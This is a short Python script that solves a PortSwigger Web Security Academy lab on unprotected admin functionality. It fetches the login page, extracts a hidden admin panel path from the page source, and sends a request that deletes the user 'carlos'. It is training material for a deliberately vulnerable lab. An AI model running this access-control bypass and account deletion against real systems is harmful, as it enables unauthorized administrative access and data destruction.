#################################################################
#
# Lab: Unprotected admin functionality with unpredictable URL
#
# Hack Steps: 
#      1. Fetch the login page
#      2. Extract the admin panel path from the source code
#      3. Delete carlos from the admin panel
#
#################################################################
import requests
import re

# Change this to your lab URL
LAB_URL = "https://0a1b00fe04f7a26b82504ea800ad00c8.web-security-academy.net"

def main():
    print("⦗1⦘ Fetching the login page.. ", end="", flush=True)
    
    # o path do painel (/admin-xxxxx) e sorteado por sessao anonima,
    # entao a pagina e o painel precisam ser acessados no mesmo cookie jar
    login_page = fetch("/login")
        
    print("OK")
    print("⦗2⦘ Extracting the admin panel path from the source code.. ", end="", flush=True)

    admin_panel_path = re.findall("'(/admin-.*)'", login_page.text)[0]

    print("OK" + " => " + admin_panel_path)
    print("⦗3⦘ Deleting carlos from the admin panel.. ", end="", flush=True)

    response = fetch(f"{admin_panel_path}/delete?username=carlos")
   
    if response.status_code == 302:
        print("OK")
        print("🗹 The lab should be marked now as " + "solved")
    else:
        print(f"⦗!⦘ Failed with status {response.status_code}")


# a sessao e criada uma vez e reutilizada em todas as requisicoes
session = requests.Session()


def fetch(path):
    try:  
        return session.get(f"{LAB_URL}{path}", allow_redirects=False)
    except:
        print("⦗!⦘ Failed to fetch " + path + " through exception")
        exit(1)
 
        
if __name__ == "__main__":
    main()

